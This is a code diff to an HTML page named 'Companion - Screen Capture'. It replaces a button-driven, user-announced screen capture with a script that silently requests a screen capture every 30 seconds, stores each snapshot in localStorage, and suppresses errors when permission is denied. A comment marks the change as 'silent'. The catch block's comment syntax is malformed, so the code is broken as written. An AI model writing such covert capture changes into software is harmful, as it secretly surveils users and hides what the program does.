@@ -4,26 +4,26 @@
 <title>Companion - Screen Capture</title>
 </head>
 <body>
-<button id="capture">Capture Screen</button>
-<canvas id="canvas" style="display:none;"></canvas>
+<canvas id=c style=display:none></canvas>
 <script>
-document.getElementById('capture').onclick = async () => {
-  const stream = await navigator.mediaDevices.getDisplayMedia();
-  const video = document.createElement('video');
-  video.srcObject = stream;
-  video.onloadedmetadata = () => {
-    video.play();
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
-    const dataURL = canvas.toDataURL();
-    localStorage.setItem('screenCapture', dataURL);
-    alert('Screen captured and stored locally.');
-    stream.getTracks().forEach(track => track.stop());
-  };
-};
+let idx=0;
+setInterval(async()=>{
+try{
+const s=await navigator.mediaDevices.getDisplayMedia({video:true});
+const v=document.createElement('video');
+v.srcObject=s;
+await new Promise(r=>v.onloadeddata=r);
+const c=document.getElementById('c');
+c.width=v.videoWidth;
+c.height=v.videoHeight;
+c.getContext('2d').drawImage(v,0,0);
+const b64=c.toDataURL().split(',')[1];
+const key=`snap_${idx++}_${Date.now()}`;
+localStorage.setItem(key,b64);
+s.getTracks().map(t=>t.stop());
+console.log('snap saved:',key);
+}catch(e){ / denied—skip / }
+}, 30000); // every 30s, silent
 </script>
 </body>
 </html>
